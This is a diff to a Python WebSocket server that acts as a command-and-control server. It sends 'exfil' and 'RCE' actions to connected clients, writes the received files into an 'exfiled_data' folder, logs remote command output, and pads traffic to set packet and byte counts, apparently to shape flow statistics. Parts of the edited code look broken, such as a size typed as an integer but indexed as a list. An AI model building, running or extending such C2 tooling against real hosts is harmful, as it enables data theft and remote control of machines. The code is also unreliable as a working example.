@@ -111,8 +111,8 @@ class WebSocketServer:
         self.sniffer.start()
         current_time = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
         #set relative path
-        project_root = Path(__file__).resolve().parent.parent
-        self.parent_folder = project_root / "websocket"
+        self.parent_folder  = Path(__file__).resolve().parent.parent
+        print(self.parent_folder)
         # Ensure the log directory exists
         log_dir = f"{self.parent_folder}/log"
         if not os.path.exists(log_dir):
@@ -132,8 +132,9 @@ class WebSocketServer:
 
         # Merge sniffer statistics into self.clients before logging
         self.clients[client_id].update(sniffed_stats)
-        logging.info(f"Sent Exfil action  {key}: {value} to be  executed on client: {client_id} underlying parmams: {self.clients[client_id]}")
-        store_exfiled_files = f"{self.parent_folder}/exfiled_data/{value}"
+        logging.info(f"Sent Exfil action  {key}: {value} to be  executed on client: {client_id}")
+        file_name = os.path.basename(value)
+        store_exfiled_files = f"{self.parent_folder}/exfiled_data/{client_id}-{datetime.now().strftime('%Y-%m-%d %H:%M:%S')}_{file_name}"
         with open(store_exfiled_files, "wb") as file:
             while True:
                 data = await websocket.recv()
@@ -144,7 +145,7 @@ class WebSocketServer:
                     break
                 file.write(data)
             file.close()
-            logging.info(f"✅ Exfil completed for file: {value} from the client: {client_id} underlying parmams: {self.clients[client_id]}")
+            logging.info(f"✅ Exfil completed for file: {value} from the client: {client_id}")
             print('✅ Exfil completed')
 
     async def rce(self, websocket, client_id, key, value):
@@ -155,12 +156,12 @@ class WebSocketServer:
 
         # Merge sniffer statistics into self.clients before logging
         self.clients[client_id].update(sniffed_stats)
-        logging.info(f"Sent RCE action {key}: {value} to be  executed on client: {client_id} underlying parmams: {self.clients[client_id]}")
+        logging.info(f"Sent RCE action {key}: {value} to be  executed on client: {client_id}")
 
         # Receive execution result
         rce_output = await websocket.recv()
        
-        logging.info(f"💻 RCE output {key}: {value} to be  executed on client: {client_id} underlying parmams: {self.clients[client_id]}")
+        logging.info(f"💻 RCE output {key}: {value} to be  executed on client: {client_id}")
         #print(f"💻 RCE output {rce_output}")
         print(f"💻 RCE successfully executed")
     def get_client_id(self, websocket):
@@ -170,8 +171,8 @@ class WebSocketServer:
             return (peername[0], peername[1], "10.11.54.137", 5000)
             #return f"{peername[0]}:{peername[1]}"
         return "unknown_client"
-    def generate_random_string(self,size):
-        return ''.join(random.choices(string.ascii_letters + string.digits, k=size)) 
+    def generate_random_string(self,size:int):
+        return ''.join(random.choices(string.ascii_letters + string.digits, k=int(size[0])))
     async def terminate_client(self, client_id):
         """Gracefully close WebSocket connection when termination criteria are met."""
         print(f"⚠️ [{client_id}] Termination conditions met. Closing connection.")
@@ -181,7 +182,7 @@ class WebSocketServer:
         except KeyError:
             pass
 
-    async def handle_client(self, websocket, path):
+    async def handle_client(self, websocket):
         client_id = self.get_client_id(websocket)
         logging.info(f"Client connected: {client_id}")
         client_config=  await websocket.recv()
@@ -197,7 +198,7 @@ class WebSocketServer:
                 # if it is exfil 
                 if "exfil" in key:
                     await self.exfil(websocket=websocket,client_id=client_id, key=key ,value=value)
-                    #IAT between each command to be executed 
+                    #Delay between each command to be executed 
                     await asyncio.sleep(random.randint(1,2))
                 elif "src2dst_max_ps" in key and value != None:
                     
@@ -209,7 +210,7 @@ class WebSocketServer:
                     await websocket.send(json.dumps({key:value}))
                     pad= self.generate_random_string(self.config["dst2src_max_ps"])
                     await websocket.send(pad)
-                elif "src2dst_packets" in key and value != None and value > 0:
+                elif "src2dst_packets" in key and value[0] != None and int(value[0]) > 0:
                     await websocket.send(json.dumps({key:value}))
                     try:
                         while True:
@@ -229,14 +230,14 @@ class WebSocketServer:
                 elif "dst2src_packets" in key and value != None and value > 0:
                     await websocket.send(json.dumps({key:value}))
                     pad = ""
-                    for i in range(value):
+                    for i in range(int(value[0])):
                         await websocket.send(pad) 
                     await websocket.send("END")
                     logging.info(f"🔥 Excute dst2src_packets  {client_id}")
                     print ("🔥Execute dst2src_packets")                  
-                elif "dst2src_bytes" in key and value != None and value > 0:
+                elif "dst2src_bytes" in key and int(value[0]) != None and int(value[0]) > 0:
                     await websocket.send(json.dumps({key:value}))
-                    pad= self.generate_random_string(self.config["dst2src_bytes"])
+                    pad= self.generate_random_string(int(value[0]))
                     await websocket.send(pad) 
                     logging.info(f"🔥 Excute dst2src_bytes  {client_id}")
                     print ("🔥Execute dst2src_bytes")                            
